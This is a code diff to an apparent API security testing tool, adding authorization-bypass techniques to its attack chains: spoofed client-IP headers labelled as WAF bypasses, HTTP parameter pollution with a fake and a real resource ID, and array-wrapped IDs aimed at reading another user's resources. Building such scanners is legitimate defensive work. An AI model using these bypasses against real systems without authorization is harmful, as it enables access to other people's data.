@@ -416,11 +416,21 @@ class ChainExecutor:
                 payload = await self.generator.generate_payload_async(attack_ep)
                 url = self._build_url(attack_ep.path, payload.get("path_params", {}))
                 
+                # WAF Bypasses for BFLA
+                headers = self._auth_headers(self.config.token_b)
+                headers.update({
+                    "X-Forwarded-For": "127.0.0.1",
+                    "X-Originating-IP": "127.0.0.1",
+                    "X-Remote-IP": "127.0.0.1",
+                    "X-Remote-Addr": "127.0.0.1",
+                    "X-Custom-IP-Authorization": "127.0.0.1"
+                })
+
                 attacker_response = await self._send_request(
                     client=client,
                     method=attack_method,
                     url=url,
-                    headers=self._auth_headers(self.config.token_b),
+                    headers=headers,
                     json_body=payload.get("body"),
                     query_params=payload.get("query_params"),
                 )
@@ -596,6 +606,31 @@ class ChainExecutor:
                     url=read_url,
                     headers=self._auth_headers(self.config.token_b),
                     query_params=read_query_params,
+                )
+            elif chain.variant == ChainVariant.BOLA_HPP:
+                # HTTP Parameter Pollution bypass
+                hpp_params = {}
+                for k, v in read_query_params.items():
+                    hpp_params[k] = [99999, v]  # [Attacker_fake_id, Owner_real_id]
+                
+                attacker_response = await self._send_request(
+                    client=client,
+                    method=attack_method,
+                    url=read_url,
+                    headers=self._auth_headers(self.config.token_b),
+                    query_params=hpp_params,
+                )
+            elif chain.variant == ChainVariant.BOLA_ARRAY:
+                # Array Wrapping bypass (usually in JSON body, but we'll try wrapping query params if it's a GET, or body if POST/PUT)
+                # For a GET read, this is similar to HPP, but we wrap the path param or query param in [] if it's body.
+                # Since READ is usually GET, we'll send it in the body as well just in case the framework accepts GET bodies.
+                array_body = {k: [v] for k, v in resource_ids.items()}
+                attacker_response = await self._send_request(
+                    client=client,
+                    method=attack_method,
+                    url=read_url,
+                    headers=self._auth_headers(self.config.token_b),
+                    json_body=array_body,
                 )
             elif chain.variant == ChainVariant.UPDATE:
                 # UPDATE BOLA test — attacker tries to modify owner's resource
